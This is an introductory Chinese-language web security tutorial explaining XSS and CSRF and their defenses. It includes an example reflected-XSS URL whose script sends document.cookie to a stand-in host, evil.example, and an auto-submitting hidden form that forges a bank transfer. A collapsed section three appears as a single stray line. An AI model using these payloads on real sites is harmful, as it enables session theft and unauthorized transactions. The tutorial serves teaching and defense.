Web 安全入门：XSS 与 CSRF 核心解析

XSS 和 CSRF 是 Web 安全里最基础也最容易混淆的两个概念。它们经常被一起讨论，但攻击原理和利用方式其实完全不同。这篇文章把两者的核心讲清楚，并总结现代框架和浏览器各自提供的防御手段。

一、XSS：把你的浏览器当跳板

XSS（Cross-Site Scripting）的本质是：攻击者把一段 JavaScript 注入到可信页面中，让其他用户执行。关键在于「代码在错误的上下文里被执行」。

三种类型

  • 反射型：payload 放在 URL 里，服务端原样拼进 HTML 返回。用户点击恶意链接触发，一次性、无需存储。
  • 存储型：payload 被持久化到数据库（如评论区、昵称），之后每个访问该页面的用户都会中招，危害最大。
  • DOM 型：前端 JS 直接读 URL 参数或 DOM 并写回页面，与服务端渲染逻辑无关。

典型场景

<!-- 服务端直接拼接用户输入 -->
<div id="msg"><?= $_GET["msg"] ?></div>

// URL 触发反射型 XSS
/site?msg=<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>

二、CSRF：借用用户的登录态

CSRF（Cross-Site Request Forgery）不注入代码，而是让已登录用户在不知情的情况下向目标站点发出请求。利用的核心是浏览器会自动带上 Cookie。

攻击链

  1. 用户已登录银行网站，且 Cookie 未过期。
  2. 用户访问攻击者的页面（邮件链接、社交平台帖子）。
  3. 页面内隐藏表单自动提交到银行的转账接口。
  4. 浏览器带 Cookie 发出请求，银行认为是用户本人操作。
<!-- 攻击者页面上的隐藏表单 -->
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.querySelector("form").submit();</script>

注意： CSRF 要求请求能被「浏览器自动携带凭证」触发。纯 JS 的 AJAX 跨站请求会因 CORS 预检失败而难以构造，因此现代 CSRF 更多针对表单提交这类简单请求。

XSS输出编码、参数化查询、CSP框架自动转义、HttpOnly Cookie

四、关键防御手段

1. 输出编码

任何进入 HTML 上下文的动态内容都必须转义。多数现代框架（React、Vue、Jinja2 自动模板）默认转义，手写模板时容易踩坑。JS 注入和属性注入的编码规则不同，需按上下文选择。

2. CSP

Content Security Policy 是 XSS 的纵深防御：限制脚本可加载的来源，配合 nonce 或 hash 让内联脚本也需显式放行。注意 CSP 是缓解手段，不能替代编码。

3. CSRF Token

服务端为每个会话生成随机 Token，表单和 AJAX 请求都必须携带，攻击者无法跨站获取该 Token。配合 SameSite Cookie 是业界标准做法。

4. 安全响应头

Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff

五、小结

XSS 是「让别人的代码在我的可信页面里跑」，CSRF 是「让浏览器以我的身份发请求」。防御上：XSS 靠编码 + CSP + 框架转义，CSRF 靠 Token + SameSite + 同源校验。理解「凭证如何随请求自动发出」是理解 CSRF 的钥匙，理解「代码在什么上下文中执行」是理解 XSS 的钥匙。
